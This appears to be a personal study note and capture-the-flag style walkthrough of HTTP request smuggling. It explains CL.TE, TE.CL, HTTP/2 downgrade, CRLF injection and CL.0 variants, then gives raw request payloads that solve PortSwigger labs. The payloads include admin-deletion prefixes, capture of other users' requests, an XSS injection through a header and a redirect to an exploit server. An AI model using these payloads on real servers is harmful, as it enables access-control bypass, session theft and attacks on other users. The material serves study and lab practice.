	
Users send requests to a front end server and this server forwards requests to one or more back-end servers.  when the front end server forwards HTTP requests to a back end server 
it typically sends requests  into the same back end  as for HTTP requests they are send one after the another and the receiving server determine where the requests ends in 

the whole idea is that the attacker causes part of their front end request to be interpreted by the back-end as the start of the next request 

HTTP 1.1 Struct
``` HTTP 
POST /login HTTP/1.1\r\n   
Host: psres.net\r\n   
User-Agent: burp\r\n   
Content-Length: 9\r\n
\r\n  
x=123&y=4
```

HTTP/2
```HTTP

:method POST
:path /login 
:authority psres.net
:scheme https
user-agent burp
x=123&y=4

```


HTTP/2 is a binary protocol like TCP, 


##### Message length 

`HTTP/1` length of each message body is indicated via content length or Transfer encoding header
`HTTP/2` those headers are redundant each message body is composed of data frames hence we apply downgrading 





### Downgrading 
HTTP/2  is when a front-end server speaks HTTP/2 with clients  but rewrites  requests into HTTP/1.1 before forwarding them on to the back end server.


Classic smuggling vulnerabilities mostly occur because the front-end and the back-end disagree about  whether to take the request's Content-Length or Transfer-Encoding header. 

Depending on which way around this desynch happens the vulnerability is classified as CL.TE or TE.CL


Classic request smuggling vulnerabilities mostly occur because the front-end and the back-end  disagree about whether to derive a request's length from CL or TE 



### Core concept :

- HTTP/1.1  sends multiple http request over single TCP 
- HTTP simply place back to back 
- HTTP/1.1 specifies 2 different way to specify where requests end: 1- content-length , Transfer-Encoding 
-  gives the attacker the ability to prepend arbitrary content at the start of the next user request 
-  the first part of the request is forwarded to the backend 
- when the second part request arrives it ends up appended onto the 1.5 something like letter G will result in GPOST


In chunked contents the message is terminated with a chunked size 0 
```HTTP
Content-Length: 6  
Transfer-Encoding: chunked      
0      
GPOST / HTTP/1.1   
Host: example.com
```


the smuggled content will be referred to as the 'prefix'

## vulns

the vuln arise
1) content length header -> es since the http/1  specification provides 2 different ways :`Content-Length: INT`
2) Transfer-Encoding -> `Transfer-Encoding: chunked`

when these 2 headers are present the Content-Length should be ignored 


the behavior of the attack:
- **CL.TE**  front end server uses the `Content Length` and the back end uses `transfer-encoding` 
	How does it work the front end processes the CE and determines that the request body is 13 bytes this request is forwarded on the back end server

	the backend server processes the TE header and treats the message body as using chunked encoding.  hence if it is stated as  0  in request body meaning is it 0 stated length , the rest of the request will be left unprocessed and the back end server will treat these as being the start of the next request in the sequence


	

- **TE.CL**  font end server use TE header and back-end uses the CL
	the front end server uses the TE header and the back end server uses the CE 
	so the front end processes the TE and treats the message body as using chunked  encoding.   processes the first chunk which could be like this 
	`8 smuggled 0`  ,  it processes the second chunk which is stated to be 0 length and treated as terminating the request  

	the back-end processes the CE that is 3 byte long  up to the start of the line following 8 bytes



- **TE.TE** from and back support TE one of the servers can be induced to not process it by obfuscating the header 

The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal),


Potential obfuscation 
```http 

Transfer-Encoding: xchunked
Transfer-Encoding : chunked 
Transfer-Encoding: chunked 
Transfer-Encoding: x 
Transfer-Encoding:[tab]chunked 
[space]Transfer-Encoding: chunked 
X: X[\n]Transfer-Encoding: chunked 
Transfer-Encoding : chunked

```



## Detection


The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.

#### CL. TE 

``` HTTP

POST /about HTTP/1.1
Host: example.com 
Transfer-Encoding: chunked   
Content-Length: 4
1
Z
Q

```
short Content-Length, the front end will forward 1 , z  the back end will time out while waiting for the next chunk size. This will cause an observable time delay. 
 
#### TE.CL

```HTTP
POST /about HTTP/1.1   
Host: example.com   
Transfer-Encoding: chunked   
Content-Length: 6      
0      
X
```

terminating '0' chunk the front-end will only forward 0  and the back end will time out waiting for the X to arrive 


## Confirm


If the first request causes an error the back-end server may decide to close the connection, discarding the poisoned buffer and breaking the attack. Try to avoid this by targeting an endpoint that is designed to accept a POST request,

Confirming the vuln consist of :

- An "attack" request that is designed to interfere with the processing of the next request.
- A "normal" request.

If the response to the normal request contains the expected attachment , then the vulnerability is confirmed


## Exploit 

example  on how would request smuggling bypass front-end security , suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL and the backend doesn't check . like calling `\home` but not `\admin`


#### By passion Client Authentication

in TLS some times it requires to perform a form of mutual TLS authentication where clients are asked to present a certificate to the server where the common name is often username or something like that  which can be used in the back-end application logic as a part of an access control mechanism.

the component that authenticates the client typically passes the relevant  details  from the certificate to the application or back-end server via one or more standard HTTP headers.

```
`X-SSL-CLIENT-CN: carlos`
```

his behavior isn't usually exploitable because front-end servers tend to overwrite these headers if they're already present. However, smuggled requests are hidden from the front-end





### Notes
-  the `attack` request and the `normal` request should be sent to the server using different network connections.
- Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work
- In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail.

## Revealing front-end request Rewriting

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used
- add `X-Forward-For` header containing the user's IP address

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

## Using HTTP request smuggling to exploit reflected XSS
if the application is vulnerable to XSS and HTTP smuggling we can use it to hit other users of the APP this give us an advantage of:
- it requires no interaction with victim users. don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
check the LAB


# HTTP/2 request smuggling

HTTP/2 downgrading is the process of rewriting the request using HTTP/1 syntax to generate an equivalent `HTTP/1` request  Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1.
### message length

fundamentally about exploitation different servers is interpreting the length of a request robust mechanism for doing this

HTTP/2  messages are sent over the wire as a series of separate "frames".  each frame is preceded by an explicit length field  which tells the server exactly how many bytes to read in.

#### H2.CL 

during downgrading, this means front-end add an `HTTP/1` `Content-Length` header  front-end servers will simply reuse this value in the resulting HTTP/1 request.

CL 0
``` HTTP
Content-Length: 0
GET /admin HTTP/1.1
Host: vulnerable-website.com 
Content-Length: 10
```


#### H2.TE

chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely

downgrades the request for an HTTP/1 back-end that does support chunked encoding


TE 0

```HTTP

POST /example HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 
0 
GET /admin HTTP/1.1
Host: vulnerable-website.com 
Foo: bar
```


### Request smuggling via CRLF injection

 HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.

`Foo: bar\nTransfer-Encoding: chunked`

This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.

HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, ***predetermined offsets*** rather than delimiter characters.
This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split

## HTTP/2 request splitting

he split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.

This approach is more versatile because you aren't dependent on using request methods that are allowed to contain a body
```HTTP
:method GET  
:path /
:authority vulnerable-website.com
foo bar\r\n \r\n GET /admin HTTP/1.1\r\n Host: vulnerable-website.com|
```
useful in cases where the `content-length` is validated and the back-end doesn't support chunked encoding.


back-end contain a `Host` header. Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. There are different approaches for doing this, which can influence where you need to position the `Host` header
 During rewriting, some front-end servers append the new `Host` header to the end of the current list of headers.
```
|   |   |
|---|---|
|:method|GET|
|:path|/|
|:authority|vulnerable-website.com|
|foo|bar\r\n Host: vulnerable-website.com\r\n \r\n GET /admin HTTP/1.1|
```

## Response queue poisoning 

- causes a front end server to start mapping responses from the back-end to the wrong request


### Note
- Send the request. When the front-end server appends `\r\n\r\n` to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.

# Browser-powered request smuggling 

#### CL.0 request smuggling

back-end sometimes ignores he `Content-length` meaning ignoring the body of incoming request this paves the way for request smuggling attacks that don't rely on chunked transfer encoding or HTTP/2 downgrading 

In some instances, servers can be persuaded to ignore the `Content-Length` header, meaning they assume that each request finishes at the end of the headers. This is effectively the same as treating the `Content-Length` as `0`.

#### Testing for CL.0 vulnerabilities

first request containing partial request in its body, then send a normal follow-up request. 
follow-up request for the home page has received a 404 response
This strongly suggests that the back-end server interpreted the body of the `POST` request (`GET /hopefully404...`) as the start of another request.

`POST /vulnerable-endpoint HTTP/1.1 Host: vulnerable-website.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 34 GET /hopefully404 HTTP/1.1 Foo: xGET / HTTP/1.1 Host: vulnerable-website.com` `HTTP/1.1 200 OK HTTP/1.1 404 Not Found`


```d
TE.CL and CL.TE // classic request smuggling 
H2.CL and H2.TE // HTTP/2 downgrade smuggling  
CL.0 // this
H2.0 // implied by CL.0  
0.CL and 0.TE // unexploitable without pipelining
```
# LABS


### HTTP request smuggling, basic CL.TE vulnerability

```HTTP
POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded 
Content-Length: 6 Transfer-Encoding: chunked 
0


G

```


### HTTP request smuggling, basic TE.CL vulnerability

```http
POST / HTTP/1.1
Host: 0a9300cb04d114d8810848e000ce00d2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0	

```

TE front end and CL back-end

front-end TE checks 56 till 0 
back-end takes the 4 byte  56  and the rest is smug

in the second request 

```http
POST / HTTP/1.1
Host: 0a9300cb04d114d8810848e000ce00d2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

### TE.TE behavior: obfuscating the TE header


```http
POST / HTTP/1.1
Host: 0a28006404874f0a896ad875003d0020.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

97
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1
0
```

2nd request

```http
POST / HTTP/1.1
Host: 0a28006404874f0a896ad875003d0020.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=a

```

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses


`POST / HTTP/1.1`
```HTTP

Content-Length: 38
tRANSFER-ENCODING: chunked

3
x=y
0

GET /404 HTTP/1.1
Foo: x
```


`GET / HTTP 1.1`
`HTTP/1.1 404 Not Found` 


since the ` GET /404` was attached to the next `GET / `request 


### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

when inserting the content length just select from after the last header till the hex size TE 

when inserting the hex size TE count from after the size till before the space of the terminator

You need to include the trailing sequence `\r\n\r\n` following the final `0`.


```HTTP
Content-length: 4
Transfer-Encoding: chunked
\r\n
5e\r\n
POST /404 HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n

```


### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```HTTP
Content-Length: 139
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
Host: localhost\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 10\r\n
\r\n
x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability


the size of hex `TE`  is from after size till before terminator `0`
uncheck the TE update 
remember to add \r\n\r\n after 0

content-type
content-length
body 
try , POST , GET 

```HTTP

Content-length: 4
Transfer-Encoding: chunked

87
GET admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-length: 100
Content-Type: application/x-www-form-urlencoded

x=1
0


```


### Exploiting HTTP request smuggling to reveal front-end request rewriting


from the POST comment we can leave the comment free for a smuggle for then next request to be attached and there we will see the  custom header 
```HTTP
Transfer-Encoding: chunked
Priority: u=0, i

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=Pr6Aw7JkfgzU3VyfpqUPDlno4fVmc6gh
Content-Length: 600

csrf=d4GpBKkWtHGBdJ4CrEI8OO5vu3VYv7xI&postId=9&name=aaa&email=a%40aa.com&website=http%3A%2F%2Fa.com&comment=
```


```HTTP

0

POST /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-ZDZARC-Ip: 127.0.0.1
Content-Length: 5

x=1
```


### Exploiting HTTP request smuggling to capture other users' requests

now the purpose is to place this prefix all above the victims request hence the lab says that the fron-end doesn't support chunked we insert a valid CL but TE is 0 to inject all of it above the next request 

for some reason we need to place a Content-type in the prefix and the request 

```HTTP
POST / HTTP/1.1
Host: 0a3d005103311177803a9e8b00af003d.web-security-academy.net
Cookie: session=smjOaQ1eTRWwNsBBkQZywiUdm5JjxcpC
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 268

0

POST /post/comment HTTP/1.1
Cookie: session=smjOaQ1eTRWwNsBBkQZywiUdm5JjxcpC
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=ogmcOer9dPhu40HFGeJs0QzjfvNUlX1x&postId=4&name=a&email=a%40a.com&website=https%3A%2F%2Fa.com&comment=test



```

play around with the  CL 
### Exploiting HTTP request smuggling to deliver reflected XSS

in the request of the `GET /post ` we notice that there is an 
`<input user-agent` unprotected value we can escape it with `">` remember for XSS use `GET`

``` HTTP
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=3 HTTP/1.1
User-Agent: aaa"><script>alert();</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```




### H2.CL request smuggling

use /resource/js since another file name will result as not found  so this file `/resource/js` already exist in the system 

```HTTP
POST / HTTP/2
Host: 0a9800c004b6d4f2d9a61bd0003400af.web-security-academy.net
Cookie: session=lKGu2SV3616Zj6fh4AQm0l4VQJOAIpI6
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-0a8e00bb0484d4ffd9521afb0162007f.exploit-server.net/
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```


### HTTP/2 request smuggling via CRLF injection


the idea is that http2 doesnt support transfer encoding chunked hence we take advantage of the CRLF which basiaclly mean `/r/n` is not interpreted as space new line in http2 but in http1 it is 


```HTTP
POST / HTTP/2
Host: 0a3900de0410a6eec950655b004b0084.web-security-academy.net
Cookie: session=ctxmuRc1rllOp8nN0XQic3Vk4rRMMa4j; _lab_analytics=90NKobxDYzS4ATrgz2G2Hq3n7PbAfPqvfHnkYWd8bJhJBYudm3N2BxD8bWJiZehPwvOUHqy5fRBPL9iudmXNK0lC7VqUoxpuDIwU2WiozpaiEBlzVAdza8RLt4TrNNovnT9LY3eSliDXCtkXBGDCfLBk1TBJR2Dpews7vSCuh3Pb2zuPEBJym2rJZsYmeEtbNC0CntTdXk8nNQpP1HG1wvaVrM2J6jF3Q6CIHphwmEf0ypGNRv5wohsEnzzDhazk
FOO: 1/r/n Transfer-Encoding: chunked
Content-Length: 218

0

POST / HTTP/1.1
Host: 0a3900de0410a6eec950655b004b0084.web-security-academy.net
Cookie: session=ctxmuRc1rllOp8nN0XQic3Vk4rRMMa4j
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

search=h
```


# HTTP/2 request splitting via CRLF injection

place the path to something unknown so when we have a different response we know the attack is successful 

```HTTP
Foo: a\r\n
\r\n
GET /admin HTTP/1.1
Host: 0a6a006704dc93fa816e757e00920095.web-security-academy.net
```

# Response queue poisoning via H2.TE request smuggling


```HTTP
POST /sdasdasd HTTP/2
Host: 0adf002f033104cd809a30e3000a009f.web-security-academy.net
Cookie: session=tvQFY2hJkbULetxemWCgK0lNqKDbKDsQ
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 0

0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0adf002f033104cd809a30e3000a009f.web-security-academy.net
Cookie: session=DYxY8jvCkquDbEGqhJXbJWQUTihBrVqd


```


# CL.0 request smuggling

add 2 requests in the  one which is normal request and the second which contain the smuggled  send them over the same connection and keep the smuggled request  as keep-alive 

1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
    
2. Add the two tabs to a group in the correct order.
    
3. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
    
4. Change the `Connection` header to `keep-alive`.
    
5. Send the sequence and check the responses.


```HTTP
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad400fd04cd3dd181b6a9f20062007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```